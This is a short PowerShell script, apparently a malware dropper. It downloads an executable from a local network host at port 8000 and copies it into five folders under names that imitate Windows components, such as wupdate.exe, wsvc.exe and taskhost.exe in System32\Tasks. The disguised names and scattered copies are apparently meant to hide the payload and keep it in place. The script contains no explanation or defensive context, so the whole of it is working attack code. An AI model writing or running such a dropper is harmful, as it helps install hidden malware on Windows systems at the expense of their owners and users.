$src = "http://192.168.0.102:8000/wmb"
$dest = "C:\ProgramData\wmb.exe"
$paths = @(
    "C:\ProgramData\wininfo\info.exe",
    "C:\Windows\Temp\windata\windata.exe",
    "C:\Users\Administrator\AppData\Local\Microsoft\Windows\winupdate\wupdate.exe",
    "C:\ProgramData\Microsoft\Windows\winsvc\wsvc.exe",
    "C:\Windows\System32\Tasks\taskhost.exe"
)

Invoke-WebRequest -Uri $src -OutFile $dest
foreach($p in $paths) {
    New-Item -Path (Split-Path $p -Parent) -ItemType Directory -Force | Out-Null
    Copy-Item -Path $dest -Destination $p -Force
}